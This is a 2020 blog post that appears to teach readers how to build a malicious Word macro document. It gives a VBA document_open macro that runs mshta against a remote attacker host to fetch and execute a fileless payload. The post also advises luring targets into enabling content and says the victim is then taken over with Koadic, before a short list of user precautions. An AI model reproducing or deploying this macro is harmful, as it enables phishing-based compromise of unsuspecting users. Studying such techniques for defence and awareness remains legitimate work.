---
title: "Create malicious office documents (Macro attack)"
date: "2020-04-19"
layout: single
tags:
- Malware
categories:
- Blog-post
---

Hello world.
This blog post is tend to show how macro attack works. We gonna create a malicious document that will execute our mshta payload.

This blog post is for education and research purpose only. If you do something bad, do with your own risk.

## Create document file in Microsoft Word

We will create a word file first and at the end of this tutorial save it as `.doc`. 

Maybe as an attacker, they will display a message to phishing user to click `enable editing` and `enable content` of the document like below picture.

![pic1](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic1.png)

## Create macro 

Click on 'view" tab

![//pic2](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic2.png)

Click Macros

![//pic3](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic3.PNG)

Type any name you want for Macro name and click "create" to create the macro

![//pic4](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic4.PNG)

On "Project" path, click ThisDocument

![//pic5](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic5.PNG)

Write our malicious macro code like below

```
Sub document_open()
    Shell ("cmd /c mshta http://192.168.83.129:9999/TPXfI")
End Sub
```
![//pic6](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic6.PNG)

You can also use other payload command line like powershell etc. The mshta attack is just an example.

In my case here, this macro will execute mshta fileless payload.

## Save as .doc

We gonna choose `.doc` or `.docm` file format to save this document because this type of document support to execute macro attack.

![//pic7](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic7.PNG)

Now, we can deliver this malicious document to target user.


# User execute and enable content
Once user open the document and enable content of our malicious document, the user will be compromised.

![//pic8.gif](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic8.gif)
Koadic now has take control our target user.

# User (victim) precaution
- Please make sure the document we've downloaded from internet/mail is clean
- Take a look who is the sender in your mail box
- Take a precautionary measures before open `.doc` or `.docm` document format.
